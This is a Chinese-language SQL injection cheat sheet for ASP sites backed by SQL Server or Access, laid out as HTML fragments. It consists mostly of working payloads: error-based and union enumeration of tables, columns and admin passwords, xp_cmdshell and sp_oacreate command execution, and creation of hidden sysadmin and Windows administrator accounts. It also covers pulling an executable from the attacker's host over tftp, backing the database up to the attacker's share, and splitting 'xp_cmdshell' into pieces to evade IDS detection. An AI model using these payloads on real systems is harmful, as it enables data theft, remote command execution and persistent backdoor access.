<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c：\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6) </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>依次提交 dbid = 7,8,9.... 得到更多的数据库名</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype='U') 暴到一个表 假设为 admin</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype='U' and name not in ('Admin')) 来得到其他的表。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype='U' and name='admin' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段,假设为 user_id</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>('id',...)) 来暴出其他的字段</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;(select user_id from BBS.dbo.admin where username&gt;1) 可以得到用户名 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>依次可以得到密码。。。。。假设存在user_id username ,password 等字段</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Show.asp?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>Show.asp?id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(union语句到处风靡啊，access也好用</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 暴库特殊技巧：:%5c='\' 或者把/和\ 修改%5提交</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype='U') 得到表名 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype='U' and name not in('Address'))</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype='U' and name='admin' and uid&gt;(str(id))) 判断id值</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://xx.xx.xx.xx/111.asp?id=3400;create table [dbo].[swap] ([swappass][char](255));-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://xx.xx.xx.xx/111.asp?id=3400 and (select top 1 swappass from swap)=1 </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;create TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread @rootkey='HKEY_LOCAL_MACHINE', @key='SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\', @value_name='/', values=@test OUTPUT insert into paths(path) values(@test)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://61.131.96.39/PageShow.asp?TianName=政策法规&amp;InfoID={57C4165A-4206-4C0D-A8D2-E70666EE4E08};use%20master;declare%20@s%20%20int;exec%20sp_oacreate%20"wscript.shell",@s%20out;exec%20sp_oamethod%20@s,"run",NULL,"cmd.exe%20/c%20ping%201.1.1.1";-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 得到了web路径d:\xxxx,接下来： </p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://xx.xx.xx.xx/111.asp?id=3400;use ku1;-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://xx.xx.xx.xx/111.asp?id=3400;create table cmd (str image);-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 传统的存在xp_cmdshell的测试过程：</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;exec master..xp_cmdshell 'dir'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;exec master.dbo.sp_addlogin hax;-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;exec master.dbo.sp_password null,hax,hax;-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;exec master.dbo.sp_addsrvrolemember hax sysadmin;-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;exec master.dbo.xp_cmdshell 'net user hax 5258 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;exec master.dbo.xp_cmdshell 'net localgroup administrators hax /add';-- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec master..xp_servicecontrol 'start', 'schedule' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec master..xp_servicecontrol 'start', 'server'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http：//www.xxx.com/list.asp?classid=1; DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C：\WINNT\system32\cmd.exe /c net user swap 5258 /add' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C：\WINNT\system32\cmd.exe /c net localgroup administrators swap/add'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>http://localhost/show.asp?id=1'; exec master..xp_cmdshell 'tftp -i youip get file.exe'- </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @a sysname set @a='xp'+'_cm'+'dshell' exec @a 'dir c:\'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;declare @a;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>如果被限制则可以。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from openrowset('sqloledb','server';'sa';'','select ''OK!'' exec master.dbo.sp_addlogin hax')</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>传统查询构造：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * FROM news where id=... AND topic=... AND .....</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>admin'and 1=(select count(*) from [user] where username='victim' and right(left(userpass,01),1)='1') and userpass &lt;&gt;'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select 123;--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;use master;--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>:a' or name like 'fff%';-- 显示有一个叫ffff的用户哈。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>'and 1&lt;&gt;(select count(email) from [user]);--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;update [users] set email=(select top 1 name from sysobjects where xtype='u' and status&gt;0) where name='ffff';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>说明:</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>上面的语句是得到数据库中的第一个用户表,并把表名放在ffff用户的邮箱字段中。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>通过查看ffff的用户资料可得第一个用表叫ad</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>然后根据表名ad得到这个表的ID</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ffff';update [users] set email=(select top 1 id from sysobjects where xtype='u' and name='ad') where name='ffff';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>象下面这样就可以得到第二个表的名字了</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ffff';update [users] set email=(select top 1 name from sysobjects where xtype='u' and id&gt;581577110) where name='ffff';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ffff';update [users] set email=(select top 1 count(id) from password) where name='ffff';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ffff';update [users] set email=(select top 1 pwd from password where id=2) where name='ffff';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>ffff';update [users] set email=(select top 1 name from password where id=2) where name='ffff';--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec master..xp_servicecontrol 'start', 'schedule' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec master..xp_servicecontrol 'start', 'server'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sp_addextendedproc 'xp_webserver', 'c:\temp\xp_foo.dll' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>扩展存储就可以通过一般的方法调用： </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>exec xp_webserver </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>一旦这个扩展存储执行过，可以这样删除它: </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sp_dropextendedproc 'xp_webserver' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into users values( 667,123,123,0xffff)-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>insert into users values ( 123, 'admin''--', 'password', 0xffff)-</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;and user&gt;0</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;;and (select count(*) from sysobjects)&gt;0</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;;and (select count(*) from mysysobjects)&gt;0 //为access数据库</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>-----------------------------------------------------------通常注射的一些介绍：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>A) ID=49 这类注入的参数是数字型，SQL语句原貌大致如下：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from 表名 where 字段=49</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>注入的参数为ID=49 And [查询条件]，即是生成语句：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from 表名 where 字段=49 And [查询条件]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(B) Class=连续剧 这类注入的参数是字符型，SQL语句原貌大致概如下：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from 表名 where 字段='连续剧' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>注入的参数为Class=连续剧' and [查询条件] and ''=' ，即是生成语句：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from 表名 where 字段='连续剧' and [查询条件] and ''=''</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>(C) 搜索时没过滤参数的，如keyword=关键字，SQL语句原貌大致如下：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from 表名 where 字段like '%关键字%' </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>注入的参数为keyword=' and [查询条件] and '%25'='， 即是生成语句：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select * from 表名 where字段like '%' and [查询条件] and '%'='%'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;;and (select Top 1 name from sysobjects where xtype='U' and status&gt;0)&gt;0</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype='U' and status&gt;0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>;;and (select Top 1 col_name(object_id('表名'),1) from sysobjects)&gt;0</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>从⑤拿到表名后，用object_id('表名')获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4...就可以逐个获取所猜解表里面的字段名。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>post.htm内容：主要是方便输入。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;iframe name=p src=# width=800 height=350 frameborder=0&gt;&lt;/iframe&gt;</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;br&gt;</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;form action=http://test.com/count.asp target=p&gt; </span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;input name="id" value="1552;update aaa set aaa=(select top 1 name from sysobjects where xtype='u' and status&gt;0);--" style="width:750"&gt;</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;input type=submit value="&gt;&gt;&gt;"&gt;</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;input type=hidden name=fno value="2, 3"&gt;</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>&lt;/form&gt;</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>枚举出他的数据表名：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>id=1552;update aaa set aaa=(select top 1 name from sysobjects where xtype='u' and status&gt;0);--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>这是将第一个表名更新到aaa的字段处。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;'刚才得到的表名'）。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>id=1552;update aaa set aaa=(select top 1 name from sysobjects where xtype='u' and status&gt;0 and name&lt;&gt;'vote');--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>然后id=1552 and exists(select * from aaa where aaa&gt;5)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>读出第二个表，^^^^^^一个个的读出，直到没有为止。</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>读字段是这样：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>id=1552;update aaa set aaa=(select top 1 col_name(object_id('表名'),1));--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>然后id=1552 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>id=1552;update aaa set aaa=(select top 1 col_name(object_id('表名'),2));--</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>然后id=1552 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>--------------------------------高级技巧：</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0 [ and name&lt;&gt;'你得到的表名' 查出一个加一个]) [ where 条件]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>select top 1 name from sysobjects where xtype=u and status&gt;0 and name not in('table1','table2',…)</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>通过SQLSERVER注入漏洞建数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>update 表名 set 字段=(select top 1 col_name(object_id('要查询的数据表名'),字段列如:1) [ where 条件]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>绕过IDS的检测[使用变量]</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>declare @a sysname set @a='xp'+'_cm'+'dshell' exec @a 'dir c:\'</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
<p style='margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 1、 开启远程数据库</p> 
<span style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'>基本语法</span> 
<br style='color:rgb(85,85,85); font-family:"microsoft yahei"; font-size:15px'> 
